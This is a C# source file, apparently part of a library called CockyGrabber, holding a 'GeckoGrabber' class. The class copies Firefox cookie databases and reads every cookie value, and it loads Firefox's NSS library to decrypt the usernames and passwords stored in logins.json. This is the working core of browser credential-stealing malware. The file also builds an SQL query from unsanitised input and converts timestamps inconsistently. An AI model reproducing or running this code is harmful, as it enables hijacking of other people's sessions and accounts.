using CockyGrabber.Utility;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class GeckoGrabber
    {
        private const string CookieCommandText = "SELECT id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,inBrowserElement,sameSite,rawSameSite,schemeMap FROM moz_cookies";
        public virtual string ProfilesPath { get; set; }
        public string[] Profiles { get; private set; }
        private const string CookiesPath = "\\cookies.sqlite";
        private const string LoginsPath = "\\logins.json";

        private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();

        public GeckoGrabber()
        {
            // Check if all profiles exist:
            if (!Directory.Exists(ProfilesPath))
                throw new GrabberException(GrabberError.ProfileNotFound, $"Gecko profile path was not found: {ProfilesPath}");

            // Store all valid gecko profiles:
            Profiles = Directory.GetDirectories(ProfilesPath).Where(str => File.Exists(str + CookiesPath) && File.Exists(str + "\\logins.json")).ToArray();
            
            JSON_Serializer.RegisterConverters(new[] { new DynamicJsonConverter() }); // Register DynamicJsonConverter for dynamic JSON (De)Serialisation
        }

        #region IO Functions
        /// <summary>
        /// Copies a file to a temporary location in %temp%
        /// </summary>
        /// <param name="path">Path to the file that should be copied to a temporary location</param>
        /// <returns>The path to the temp file</returns>
        private string CopyToTempFile(string path)
        {
            string tempFilePath = GetTempFilePath();
            if (File.Exists(tempFilePath)) // If File already exists:
                return CopyToTempFile(path); // Repeat previous steps
            File.Copy(path, tempFilePath);
            return tempFilePath;
        }

        /// <summary>
        /// Create an imaginary path to a temporary file in %temp%
        /// </summary>
        /// <returns>The path to the temp file</returns>
        private string GetTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString()); // This is better than Path.GetTempFileName() because GetTempFileName is most of the time inaccurate

        /// <summary>
        /// Returns a value depending on if the database of a specific profile with the stored cookies was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the cookies exist</returns>
        public bool CookiesExist(string profilePath) => File.Exists(profilePath + CookiesPath);

        /// <summary>
        /// Returns a value depending on if the database of a specific profile with the stored logins was found
        /// </summary>
        /// <param name="profilePath">Path to the gecko profile</param>
        /// <returns>True if the logins exist</returns>
        public bool LoginsExist(string profilePath) => File.Exists(profilePath + LoginsPath);
        #endregion

        #region GetCookies()
        public IEnumerable<Gecko.Cookie> GetCookiesBy(Gecko.CookieHeader by, object value)
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{CookieCommandText} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6)),
                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return cookies;
        }

        public IEnumerable<Gecko.Cookie> GetCookies()
        {
            List<Gecko.Cookie> cookies = new List<Gecko.Cookie>();
            foreach (string profile in Profiles)
            {
                if (!CookiesExist(profile)) throw new GrabberException(GrabberError.CookiesNotFound, $"The Cookie database could not be found: {CookieCommandText}"); // throw a Exception if the Cookie DB was not found

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + CookiesPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = CookieCommandText;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Gecko.Cookie()
                            {
                                Id = reader.GetInt32(0),
                                OriginAttributes = reader.GetString(1),
                                Name = reader.GetString(2),
                                Value = reader.GetString(3),
                                Host = reader.GetString(4),
                                Path = reader.GetString(5),
                                Expiry = UnixTimeInSecondsToDate(reader.GetInt64(6) * 1000),
                                LastAccessed = UnixTimeInMicrosecondsToDate(reader.GetInt64(7)),
                                CreationTime = UnixTimeInMicrosecondsToDate(reader.GetInt64(8)),
                                IsSecure = reader.GetBoolean(9),
                                IsHttpOnly = reader.GetBoolean(10),
                                InBrowserElement = reader.GetBoolean(11),
                                SameSite = reader.GetInt16(12),
                                RawSameSite = reader.GetInt16(13),
                                SchemeMap = reader.GetInt16(14),
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            }
            return cookies;
        }
        #endregion

        #region GetLogins()
        /// <summary>
        /// Converts the as parameter passed dynamic object to a list of Logins
        /// </summary>
        /// <param name="logins">dynamic json object</param>
        /// <returns>A list of Gecko Logins</returns>
        private static List<Gecko.Login> ConvertDynamicObjectsToLogins(List<object> logins)
        {
            List<Gecko.Login> _logins = new List<Gecko.Login>();
            foreach (dynamic obj in logins)
            {
                _logins.Add(new Gecko.Login
                {
                    Id = obj.id,
                    Hostname = (string)obj.hostname,
                    HttpRealm = (string)obj.httpRealm,
                    FormSubmitURL = (string)obj.formSubmitURL,
                    UsernameField = (string)obj.usernameField,
                    PasswordField = (string)obj.passwordField,
                    EncryptedUsername = (string)obj.encryptedUsername,
                    DecryptedUsername = FirefoxDecryptor.DecryptValue((string)obj.encryptedUsername),
                    EncryptedPassword = (string)obj.encryptedPassword,
                    DecryptedPassword = FirefoxDecryptor.DecryptValue((string)obj.encryptedPassword),
                    Guid = (string)obj.guid,
                    EncType = (short)obj.encType,
                    TimeCreated = UnixTimeInMillisecondsToDate((long)obj.timeCreated),
                    TimeLastUsed = UnixTimeInMillisecondsToDate((long)obj.timeLastUsed),
                    TimePasswordChanged = UnixTimeInMillisecondsToDate((long)obj.timePasswordChanged),
                    TimesUsed = (uint)obj.timesUsed,
                });
            }
            return _logins;
        }

        public IEnumerable<Gecko.Login> GetLogins()
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            FirefoxDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw an Exception if the Login File was not found

                if (!FirefoxDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
                List<Gecko.Login> _logins = ConvertDynamicObjectsToLogins(json.logins);
                logins.AddRange(_logins);
            }
            FirefoxDecryptor.UnLoadNSS(); // Unload NSS
            return logins;
        }

        public IEnumerable<Gecko.Login> GetLoginsBy(Gecko.LoginHeader by, object value)
        {
            List<Gecko.Login> logins = new List<Gecko.Login>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            FirefoxDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox"); // Load NSS
            foreach (string profile in Profiles)
            {
                if (!LoginsExist(profile)) throw new GrabberException(GrabberError.LoginsNotFound, $"The Login File could not be found: {LoginsPath}"); // throw a Exception if the Login File was not found

                if (!FirefoxDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + LoginsPath), typeof(object));
                foreach (Gecko.Login l in ConvertDynamicObjectsToLogins(json.logins))
                {
                    switch (by)
                    {
                        case Gecko.LoginHeader.id:
                            if (l.Id == (int)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.hostname:
                            if (l.Hostname == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.httpRealm:
                            if (l.HttpRealm == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.formSubmitURL:
                            if (l.FormSubmitURL == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.usernameField:
                            if (l.UsernameField == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.passwordField:
                            if (l.PasswordField == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.encryptedUsername:
                            if (l.EncryptedUsername == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.encryptedPassword:
                            if (l.EncryptedPassword == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.guid:
                            if (l.Guid == (string)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.encType:
                            if (l.EncType == (short)value) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.timeCreated:
                            if (l.TimeCreated == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.timeLastUsed:
                            if (l.TimeLastUsed == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.timePasswordChanged:
                            if (l.TimePasswordChanged == UnixTimeInMillisecondsToDate((long)value)) logins.Add(l);
                            break;
                        case Gecko.LoginHeader.timesUsed:
                            if (l.TimesUsed == (int)value) logins.Add(l);
                            break;
                    }
                }
                FirefoxDecryptor.UnLoadNSS(); // Unload NSS
            }
            return logins;
        }
        #endregion

        // TimeStamp To DateTimeOffset functions:
        private static DateTimeOffset UnixTimeInSecondsToDate(long seconds) => DateTimeOffset.FromUnixTimeMilliseconds(seconds/* * 1000*/);
        private static DateTimeOffset UnixTimeInMillisecondsToDate(long milliSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(milliSeconds);
        private static DateTimeOffset UnixTimeInMicrosecondsToDate(long microSeconds) => DateTimeOffset.FromUnixTimeMilliseconds(microSeconds / 1000);
    }
}